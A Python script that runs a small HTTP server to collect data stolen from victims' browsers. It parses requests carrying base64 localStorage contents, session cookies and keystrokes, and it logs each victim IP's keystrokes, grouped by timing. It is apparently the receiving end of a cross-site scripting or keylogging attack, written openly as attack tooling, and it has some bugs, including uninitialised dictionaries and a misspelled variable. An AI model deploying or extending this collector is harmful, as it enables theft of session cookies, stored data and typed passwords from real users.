"""
 Implements a simple HTTP/1.0 Server to listen for exfiltrated data
 Currently stores everything in memory, but primarily dumps it to 
 the screen.

 TODO:  implement saving to file

"""

import socket
import re
import time
import base64
import json

# Define socket host and port
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 8000

# Create socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(1)
print('Listening on port %s ...' % SERVER_PORT)

# These data constructs need to track a couple pieces of data.
# Data and Cookie need to track Host and Data ingested
# Keylog needs to track Host, Timestamp, and Data ingested
# dataExfil Dictionary, key on IP, store data ingested in a list
# cookieExfil Dictionary, key on IP, store data ingested in a list
# keylog dictionary, key on IP, data in a list
# keylogTimer dictionary, key on IP, timestamp of last transaction
cookieExfil = {}
dataExfil = {}
keylogData = {}
keylogTimestamp = {}

while True:  
    # Start Timer
    startTime = time.time()

    # Wait for client connections
    client_connection, client_address = server_socket.accept()

    # Get the client request
    request = client_connection.recv(1024).decode()
    
    # REGEX to strip the data out of the request between GET and HTTP
    regex = r"^GET \/([a-zA-Z0-9]+)\?([a-zA-Z0-9]+)=(.*) HTTP\/1"
    regResult = re.search( regex, request )

    print( f"Connection from: {client_address[0]}" )

    if regResult == None:
        print( "No useable data" )
        client_connection.close()
        continue
    # switch by matchSet 0
    # Break out the various expected paths
    match regResult.group(1):
        # if matchSet 0 = exfil
        # exfil     exfil?
        case "exfil":
            # switch by match 1
            # data      data=
            # cookie    cookie=
            match regResult.group(2):
                # data is base64 encoded, break it out, then JSON prettify it, then print it and store it
                case "data":
                    dataExfil[client_address[0]].append( regResult.group(3) )
                    print( f"Exfiltrated localStorage:\n{json.dumps( base64.b64decode(dataExfil[client_address[0]][-1]), indent=2)}" )
                # data is base64 encoded, break it out, 
                case "cookie":
                    cookieExfil[client_address[0]].append( regResult.group(3) )
                    print( f"Exfiltrated cookie: \n{base64.b64decode(cookieExfile[client_address[0]][-1])}" )
                case _:
                    print( f"Invalid Exfil value: {regResult.group(2)}\n{regResult.group(3)}" )
        # if matchSet 0 = k
        case "k":
            # keyLog    k?key=
            # verify matchset 1 is key, if no match, continue
            if( regResult.group(2) != 'key' ):
                print( f"Invalid keylog value: {regResult.group(2)}\n{regResult.group(3)}" )
                client_connection.close()
                continue
            if regResult.group(3):
                char = regResult.group(3)
            else:
                char = ' '
            
            currTime = time.time()
            # if time < threshhold then add keylog to current index, else add a new entry 
            if client_address[0] in keylogTimestamp:
                if (currTime - keylogTimestamp[client_address[0]]) < 1:
                    keylogData[client_address[0]][-1] = keylogData[client_address[0]][-1] + char
                else:
                    keylogData[client_address[0]].append(char)
            else:
                keylogData[client_address[0]] = list()
                keylogData[client_address[0]].append(char)
            keylogTimestamp[client_address[0]] = currTime
            print( *keylogData[client_address[0]], sep='\n' )
        case _:
            print( f"Invalid request: {regResult.group(0)}\n{regResult.group(1)}\n{regResult.group(2)}\n{regResult.group(3)}" )
            client_connection.close()
            continue
    # Send HTTP response
    response = 'HTTP/1.0 200 OK\n\nHello World'
    client_connection.sendall(response.encode())
    client_connection.close()

# Close socket
server_socket.close()
